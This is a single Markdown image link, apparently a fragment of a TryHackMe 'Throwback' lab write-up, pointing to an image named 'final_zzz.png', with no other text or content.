![final_zzz](/assets/img/tryhackme/throwback/final_zzz.png)
